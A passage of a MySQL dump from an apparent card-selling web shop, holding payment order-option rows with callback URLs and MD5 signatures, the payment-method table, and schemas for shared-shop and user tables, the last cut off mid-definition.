0,\"out_trade_no\":\"271230503161623609\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=271230503161623609\",\"sitename\":\"271230503161623609\",\"sign\":\"c36aae31e07c4d88eb9c0c5e7963a756\",\"sign_type\":\"MD5\"}'),(10,10,'{\"pid\":\"1000\",\"name\":\"824230503161851102\",\"type\":\"alipay\",\"money\":50,\"out_trade_no\":\"824230503161851102\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=824230503161851102\",\"sitename\":\"824230503161851102\",\"sign\":\"46b0eb07a737e4b728689a4ef4d38360\",\"sign_type\":\"MD5\"}'),(11,11,'{\"pid\":\"1000\",\"name\":\"613230505174210348\",\"type\":\"wxpay\",\"money\":50,\"out_trade_no\":\"613230505174210348\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=613230505174210348\",\"sitename\":\"613230505174210348\",\"sign\":\"59e0e69de66201ef7b5429bce36b56cb\",\"sign_type\":\"MD5\"}'),(12,12,'{\"pid\":\"1000\",\"name\":\"717230505174221944\",\"type\":\"USDT-TRC20\",\"money\":50,\"out_trade_no\":\"717230505174221944\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=717230505174221944\",\"sitename\":\"717230505174221944\",\"sign\":\"99cd7addc5391f5e1e06d731b860590d\",\"sign_type\":\"MD5\"}'),(13,13,'{\"pid\":\"1000\",\"name\":\"408230505174224584\",\"type\":\"TRX\",\"money\":50,\"out_trade_no\":\"408230505174224584\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=408230505174224584\",\"sitename\":\"408230505174224584\",\"sign\":\"0a9f2d1bd947e25512a77afd23ae7fc1\",\"sign_type\":\"MD5\"}'),(14,14,'{\"pid\":\"1000\",\"name\":\"206230505200546995\",\"type\":\"alipay\",\"money\":50,\"out_trade_no\":\"206230505200546995\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=206230505200546995\",\"sitename\":\"206230505200546995\",\"sign\":\"2a2416ba95348fae2df6b6c962b68409\",\"sign_type\":\"MD5\"}'),(15,15,'{\"pid\":\"1000\",\"name\":\"378230508172826122\",\"type\":\"alipay\",\"money\":70,\"out_trade_no\":\"378230508172826122\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=378230508172826122\",\"sitename\":\"378230508172826122\",\"sign\":\"8b50d28cdf9e70fe1c7c2e0f36c6509a\",\"sign_type\":\"MD5\"}'),(16,16,'{\"pid\":\"1000\",\"name\":\"201230508233330196\",\"type\":\"alipay\",\"money\":100,\"out_trade_no\":\"201230508233330196\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=201230508233330196\",\"sitename\":\"201230508233330196\",\"sign\":\"30f231cefa4608378ae68bd81b97ec52\",\"sign_type\":\"MD5\"}'),(17,17,'{\"pid\":\"1000\",\"name\":\"834230510191706221\",\"type\":\"TRX\",\"money\":50,\"out_trade_no\":\"834230510191706221\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=834230510191706221\",\"sitename\":\"834230510191706221\",\"sign\":\"978a6fbc95a8329dc388d19132818e6e\",\"sign_type\":\"MD5\"}'),(18,18,'{\"pid\":\"1000\",\"name\":\"923230511110957623\",\"type\":\"alipay\",\"money\":200,\"out_trade_no\":\"923230511110957623\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=923230511110957623\",\"sitename\":\"923230511110957623\",\"sign\":\"1bbadc60c38204d77fa9d0042d3a76cd\",\"sign_type\":\"MD5\"}'),(19,19,'{\"pid\":\"1000\",\"name\":\"607230517230546913\",\"type\":\"alipay\",\"money\":200,\"out_trade_no\":\"607230517230546913\",\"notify_url\":\"https:\\/\\/fk.fun513.xyz\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.xyz\\/user\\/index\\/query?tradeNo=607230517230546913\",\"sitename\":\"607230517230546913\",\"sign\":\"867cb54c2a6b8595a1d2ffcfa30ba348\",\"sign_type\":\"MD5\"}'),(20,20,'{\"pid\":\"1000\",\"name\":\"255230518192605786\",\"type\":\"USDT-TRC20\",\"money\":50,\"out_trade_no\":\"255230518192605786\",\"notify_url\":\"https:\\/\\/fk.fun513.xyz\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.xyz\\/user\\/index\\/query?tradeNo=255230518192605786\",\"sitename\":\"255230518192605786\",\"sign\":\"e4dd0a6865b69593d0cdc0e948fa4b2b\",\"sign_type\":\"MD5\"}'),(21,21,'{\"pid\":\"1000\",\"name\":\"193230522134122673\",\"type\":\"TRX\",\"money\":50,\"out_trade_no\":\"193230522134122673\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=193230522134122673\",\"sitename\":\"193230522134122673\",\"sign\":\"0f9abb12be0fe3819a5e2ba936497cf6\",\"sign_type\":\"MD5\"}'),(22,22,'{\"pid\":\"1000\",\"name\":\"811230522134203778\",\"type\":\"USDT-TRC20\",\"money\":50,\"out_trade_no\":\"811230522134203778\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=811230522134203778\",\"sitename\":\"811230522134203778\",\"sign\":\"16d9fa1574be29e5ef3e34a32bb95411\",\"sign_type\":\"MD5\"}'),(23,23,'{\"pid\":\"1000\",\"name\":\"764230601183704447\",\"type\":\"alipay\",\"money\":50,\"out_trade_no\":\"764230601183704447\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=764230601183704447\",\"sitename\":\"764230601183704447\",\"sign\":\"593ee0986e3102197e498b7774d90027\",\"sign_type\":\"MD5\"}'),(24,24,'{\"pid\":\"1000\",\"name\":\"130230605081338268\",\"type\":\"alipay\",\"money\":260,\"out_trade_no\":\"130230605081338268\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=130230605081338268\",\"sitename\":\"130230605081338268\",\"sign\":\"79b9f45ddcf58226f3dea198b89cbf97\",\"sign_type\":\"MD5\"}'),(25,25,'{\"pid\":\"1000\",\"name\":\"229230605081404227\",\"type\":\"wxpay\",\"money\":260,\"out_trade_no\":\"229230605081404227\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=229230605081404227\",\"sitename\":\"229230605081404227\",\"sign\":\"e05c4143ed8d90c0d05ebc6b05646a6a\",\"sign_type\":\"MD5\"}'),(26,26,'{\"pid\":\"1000\",\"name\":\"557230605081514870\",\"type\":\"alipay\",\"money\":260,\"out_trade_no\":\"557230605081514870\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=557230605081514870\",\"sitename\":\"557230605081514870\",\"sign\":\"982a65047f486bad5d2aebe55ed6108c\",\"sign_type\":\"MD5\"}'),(27,27,'{\"pid\":\"1000\",\"name\":\"386230605111610619\",\"type\":\"USDT-TRC20\",\"money\":50,\"out_trade_no\":\"386230605111610619\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=386230605111610619\",\"sitename\":\"386230605111610619\",\"sign\":\"228ddab4a05cb9d57793a696ef0bb6fd\",\"sign_type\":\"MD5\"}'),(28,28,'{\"pid\":\"1000\",\"name\":\"566230605111834833\",\"type\":\"TRX\",\"money\":50,\"out_trade_no\":\"566230605111834833\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=566230605111834833\",\"sitename\":\"566230605111834833\",\"sign\":\"be8afb6c068e4764311f983e5e6620c9\",\"sign_type\":\"MD5\"}'),(29,29,'{\"pid\":\"1000\",\"name\":\"645230605112503694\",\"type\":\"USDT-TRC20\",\"money\":50,\"out_trade_no\":\"645230605112503694\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=645230605112503694\",\"sitename\":\"645230605112503694\",\"sign\":\"33d0812538dc24681cc5f5bce3131e20\",\"sign_type\":\"MD5\"}'),(30,30,'{\"pid\":\"1000\",\"name\":\"386230605113527786\",\"type\":\"USDT-TRC20\",\"money\":50,\"out_trade_no\":\"386230605113527786\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=386230605113527786\",\"sitename\":\"386230605113527786\",\"sign\":\"40bcef30de65ebd9be7d910484b1853a\",\"sign_type\":\"MD5\"}'),(31,31,'{\"pid\":\"1000\",\"name\":\"181230605113630502\",\"type\":\"USDT_TRC20\",\"money\":50,\"out_trade_no\":\"181230605113630502\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=181230605113630502\",\"sitename\":\"181230605113630502\",\"sign\":\"9b09010741b6c1bcc0df49eed2785197\",\"sign_type\":\"MD5\"}'),(32,32,'{\"pid\":\"1000\",\"name\":\"985230605113733764\",\"type\":\"USDT_TRC20\",\"money\":50,\"out_trade_no\":\"985230605113733764\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=985230605113733764\",\"sitename\":\"985230605113733764\",\"sign\":\"3ce71e8678bf195513421d1c68b3a97d\",\"sign_type\":\"MD5\"}'),(33,33,'{\"pid\":\"1000\",\"name\":\"876230605135747713\",\"type\":\"wxpay\",\"money\":100,\"out_trade_no\":\"876230605135747713\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=876230605135747713\",\"sitename\":\"876230605135747713\",\"sign\":\"8387bc0f972875f5564e95d60fa12457\",\"sign_type\":\"MD5\"}'),(34,34,'{\"pid\":\"1000\",\"name\":\"780230607223950226\",\"type\":\"wxpay\",\"money\":50,\"out_trade_no\":\"780230607223950226\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=780230607223950226\",\"sitename\":\"780230607223950226\",\"sign\":\"a525f84422f8950d6664da18f1e19d48\",\"sign_type\":\"MD5\"}'),(35,35,'{\"pid\":\"1000\",\"name\":\"489230609155212207\",\"type\":\"wxpay\",\"money\":70,\"out_trade_no\":\"489230609155212207\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=489230609155212207\",\"sitename\":\"489230609155212207\",\"sign\":\"fc9540777451fcdd6cc631d29c2c873b\",\"sign_type\":\"MD5\"}'),(36,36,'{\"pid\":\"1000\",\"name\":\"464230610180021216\",\"type\":\"USDT_TRC20\",\"money\":50,\"out_trade_no\":\"464230610180021216\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=464230610180021216\",\"sitename\":\"464230610180021216\",\"sign\":\"4e37bb9be7f6c4d17a8c0b21910e9445\",\"sign_type\":\"MD5\"}'),(37,37,'{\"pid\":\"1000\",\"name\":\"827230611083401317\",\"type\":\"USDT_TRC20\",\"money\":120,\"out_trade_no\":\"827230611083401317\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=827230611083401317\",\"sitename\":\"827230611083401317\",\"sign\":\"648fb975802fe2866cfd3d7ecd0ed415\",\"sign_type\":\"MD5\"}'),(38,38,'{\"pid\":\"1000\",\"name\":\"992230611083510519\",\"type\":\"USDT_TRC20\",\"money\":150,\"out_trade_no\":\"992230611083510519\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=992230611083510519\",\"sitename\":\"992230611083510519\",\"sign\":\"ed0e4428a66d76238fccbc2e412c2379\",\"sign_type\":\"MD5\"}'),(39,39,'{\"pid\":\"1000\",\"name\":\"294230611144924665\",\"type\":\"USDT_TRC20\",\"money\":50,\"out_trade_no\":\"294230611144924665\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=294230611144924665\",\"sitename\":\"294230611144924665\",\"sign\":\"7d6fdc2a3e97a3ef5bee0b9c013d0f89\",\"sign_type\":\"MD5\"}'),(40,40,'{\"pid\":\"1000\",\"name\":\"911230612193313903\",\"type\":\"wxpay\",\"money\":50,\"out_trade_no\":\"911230612193313903\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=911230612193313903\",\"sitename\":\"911230612193313903\",\"sign\":\"2f8dde8de9fe4fa73f7db036354f5051\",\"sign_type\":\"MD5\"}'),(41,41,'{\"pid\":\"1000\",\"name\":\"453230613121727934\",\"type\":\"USDT_TRC20\",\"money\":50,\"out_trade_no\":\"453230613121727934\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=453230613121727934\",\"sitename\":\"453230613121727934\",\"sign\":\"a8ffd73c8f0fa8d73cbe1769b7694e41\",\"sign_type\":\"MD5\"}'),(42,42,'{\"pid\":\"1000\",\"name\":\"485230613201231763\",\"type\":\"alipay\",\"money\":100,\"out_trade_no\":\"485230613201231763\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=485230613201231763\",\"sitename\":\"485230613201231763\",\"sign\":\"4520046ee61badc5092d529b368f4e75\",\"sign_type\":\"MD5\"}'),(43,43,'{\"pid\":\"1000\",\"name\":\"720230613201438361\",\"type\":\"alipay\",\"money\":100,\"out_trade_no\":\"720230613201438361\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=720230613201438361\",\"sitename\":\"720230613201438361\",\"sign\":\"477dc02780e6458f1d464d71dd7d723e\",\"sign_type\":\"MD5\"}'),(44,44,'{\"pid\":\"1000\",\"name\":\"976230613201721238\",\"type\":\"wxpay\",\"money\":100,\"out_trade_no\":\"976230613201721238\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=976230613201721238\",\"sitename\":\"976230613201721238\",\"sign\":\"5c02ec9194c65446bd4aaf913b76a351\",\"sign_type\":\"MD5\"}'),(45,45,'{\"pid\":\"1000\",\"name\":\"931230613202045844\",\"type\":\"alipay\",\"money\":100,\"out_trade_no\":\"931230613202045844\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=931230613202045844\",\"sitename\":\"931230613202045844\",\"sign\":\"dd796017a1a4642fcc576b08a97a99ed\",\"sign_type\":\"MD5\"}'),(46,46,'{\"pid\":\"1000\",\"name\":\"332230613203512224\",\"type\":\"alipay\",\"money\":50,\"out_trade_no\":\"332230613203512224\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=332230613203512224\",\"sitename\":\"332230613203512224\",\"sign\":\"18941da987f6d45c889e0edea884c60c\",\"sign_type\":\"MD5\"}'),(47,47,'{\"pid\":\"1000\",\"name\":\"980230613204921883\",\"type\":\"alipay\",\"money\":100,\"out_trade_no\":\"980230613204921883\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=980230613204921883\",\"sitename\":\"980230613204921883\",\"sign\":\"ac95b940a7c22782d6b68bac968acda7\",\"sign_type\":\"MD5\"}'),(48,48,'{\"pid\":\"1000\",\"name\":\"319230614211652520\",\"type\":\"wxpay\",\"money\":100,\"out_trade_no\":\"319230614211652520\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=319230614211652520\",\"sitename\":\"319230614211652520\",\"sign\":\"436dae5503c9ac8d19e81503aabfca28\",\"sign_type\":\"MD5\"}'),(49,49,'{\"pid\":\"1000\",\"name\":\"641230614211851376\",\"type\":\"alipay\",\"money\":100,\"out_trade_no\":\"641230614211851376\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=641230614211851376\",\"sitename\":\"641230614211851376\",\"sign\":\"01482e461f74b287a1ce6b3041a32a76\",\"sign_type\":\"MD5\"}'),(50,50,'{\"pid\":\"1000\",\"name\":\"348230617071313995\",\"type\":\"alipay\",\"money\":200,\"out_trade_no\":\"348230617071313995\",\"notify_url\":\"https:\\/\\/fk.fun513.xyz\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.xyz\\/user\\/index\\/query?tradeNo=348230617071313995\",\"sitename\":\"348230617071313995\",\"sign\":\"9ac98e9cf2cac6381227aab38d7d1d3c\",\"sign_type\":\"MD5\"}'),(51,51,'{\"pid\":\"1000\",\"name\":\"295230617232232898\",\"type\":\"wxpay\",\"money\":50,\"out_trade_no\":\"295230617232232898\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=295230617232232898\",\"sitename\":\"295230617232232898\",\"sign\":\"cb4958885ab63d6885f84aba1636b199\",\"sign_type\":\"MD5\"}'),(52,52,'{\"pid\":\"1000\",\"name\":\"665230617232242385\",\"type\":\"USDT_TRC20\",\"money\":50,\"out_trade_no\":\"665230617232242385\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=665230617232242385\",\"sitename\":\"665230617232242385\",\"sign\":\"f740a7cbcca1474a6c004e644cf7c6e5\",\"sign_type\":\"MD5\"}'),(53,53,'{\"pid\":\"1000\",\"name\":\"141230622195723339\",\"type\":\"alipay\",\"money\":160,\"out_trade_no\":\"141230622195723339\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=141230622195723339\",\"sitename\":\"141230622195723339\",\"sign\":\"940d84877e729d6ad4236ce7da6bdd31\",\"sign_type\":\"MD5\"}'),(54,54,'{\"pid\":\"1000\",\"name\":\"285230622195839265\",\"type\":\"alipay\",\"money\":160,\"out_trade_no\":\"285230622195839265\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=285230622195839265\",\"sitename\":\"285230622195839265\",\"sign\":\"ec6fc4d0134f036748812a1d59d14898\",\"sign_type\":\"MD5\"}'),(55,55,'{\"pid\":\"1000\",\"name\":\"380230624145542970\",\"type\":\"wxpay\",\"money\":50,\"out_trade_no\":\"380230624145542970\",\"notify_url\":\"https:\\/\\/fk.fun513.com\\/user\\/api\\/order\\/callback.Epay\",\"return_url\":\"https:\\/\\/fk.fun513.com\\/user\\/index\\/query?tradeNo=380230624145542970\",\"sitename\":\"380230624145542970\",\"sign\":\"81c126bb9a0597870a96eae787ce7d98\",\"sign_type\":\"MD5\"}');
/*!40000 ALTER TABLE `acg_order_option` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `acg_pay`
--

DROP TABLE IF EXISTS `acg_pay`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `acg_pay` (
  `id` int unsigned NOT NULL AUTO_INCREMENT COMMENT '主键id',
  `name` varchar(16) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '支付名称',
  `icon` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '图标',
  `code` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '支付代码',
  `commodity` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '前台状态：0=停用，1=启用',
  `recharge` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '充值状态：0=停用，1=启用',
  `create_time` datetime NOT NULL COMMENT '添加时间',
  `handle` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '支付平台',
  `sort` smallint unsigned NOT NULL DEFAULT '0' COMMENT '排序',
  `equipment` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '设备：0=通用，1=手机，2=电脑',
  `cost` decimal(10,3) unsigned DEFAULT '0.000' COMMENT '手续费',
  `cost_type` tinyint unsigned DEFAULT '0' COMMENT '手续费模式：0=单笔固定，1=百分比',
  PRIMARY KEY (`id`) USING BTREE,
  KEY `commodity` (`commodity`) USING BTREE,
  KEY `recharge` (`recharge`) USING BTREE,
  KEY `sort` (`sort`) USING BTREE,
  KEY `equipment` (`equipment`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci ROW_FORMAT=DYNAMIC;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `acg_pay`
--

LOCK TABLES `acg_pay` WRITE;
/*!40000 ALTER TABLE `acg_pay` DISABLE KEYS */;
INSERT INTO `acg_pay` VALUES (1,'余额','/assets/static/images/wallet.png','#system',1,0,'1997-01-01 00:00:00','#system',999,0,0.000,0),(2,'支付宝','/assets/user/images/cash/alipay.png','alipay',1,1,'1997-01-01 00:00:00','Epay',1,0,0.000,0),(3,'微信','/assets/cache/images/202304301507417170977.png','wxpay',1,1,'2023-04-30 15:07:44','Epay',0,0,0.000,0),(4,'USDT','/assets/cache/images/202304301501123126473.png','USDT_TRC20',1,1,'2023-06-05 11:36:22','Epay',2,0,0.000,0),(5,'TRX','/assets/cache/images/202304301501247371275.png','TRX',1,1,'2023-04-30 15:01:27','Epay',3,0,0.000,0);
/*!40000 ALTER TABLE `acg_pay` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `acg_shared`
--

DROP TABLE IF EXISTS `acg_shared`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `acg_shared` (
  `id` int unsigned NOT NULL AUTO_INCREMENT COMMENT '主键id',
  `type` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '对接类型：0=内置，其他待扩展',
  `name` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '店铺名称',
  `domain` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '店铺地址',
  `app_id` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '商户ID',
  `app_key` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '密钥',
  `create_time` datetime NOT NULL COMMENT '创建时间',
  `balance` decimal(14,2) unsigned NOT NULL DEFAULT '0.00' COMMENT '余额(缓存)',
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE KEY `domain` (`domain`) USING BTREE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci ROW_FORMAT=DYNAMIC;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `acg_shared`
--

LOCK TABLES `acg_shared` WRITE;
/*!40000 ALTER TABLE `acg_shared` DISABLE KEYS */;
/*!40000 ALTER TABLE `acg_shared` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `acg_user`
--

DROP TABLE IF EXISTS `acg_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `acg_user` (
  `id` int unsigned NOT NULL AUTO_INCREMENT COMMENT '主键id',
  `username` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '会员名',
  `email` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '邮箱',
  `phone` varchar(16) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '手机',
  `qq` varchar(16) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT 'QQ号',
  `password` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '登录密码',
  `salt` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '盐',
  `app_key` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '对接密钥',
  `avatar` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '头像',
  `balance` decimal(14,2) unsigned NOT NULL DEFAULT '0.00' COMMENT '余额',
  `coin` decimal(14,2) unsigned NOT NULL DEFAULT '0.00' COMMENT '硬币，可提现的币',
  `integral` int unsigned NOT NULL DEFAULT '0' COMMENT '积分',
  `create_time` datetime NOT NULL COMMENT '注册时间',
  `login_time` datetime DEFAULT NULL COMMENT '登录时间',
  `last_login_time` datetime DEFAULT NULL COMMENT '上一次登录时间',
  `login_ip` varchar(128) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL COMMENT '登录IP',
  `last_login_ip` varchar(128) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL COMMENT '上一次登录IP',
  `pid` int unsigned DEFAULT '0' COMMENT '上级ID',
  `recharge` decimal(14,2) unsigned NOT NULL DEFAULT '0.00' COMMENT '累计充值',
  `total_coin` decimal(14,2) unsigned NOT NULL DEFAULT '0.00' COMMENT '累计获得的硬币',
  `status` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '状态：0=封禁，1=正常',
  `business_level` int unsigned DEFAULT NULL COMMENT '商户等级id',
  `nicename` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '真实姓名',
  `alipay` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '支付宝账号',
  `wechat` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '微信收款二维码',
  `settlement` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '自动结算：0=支付宝，1=微信',
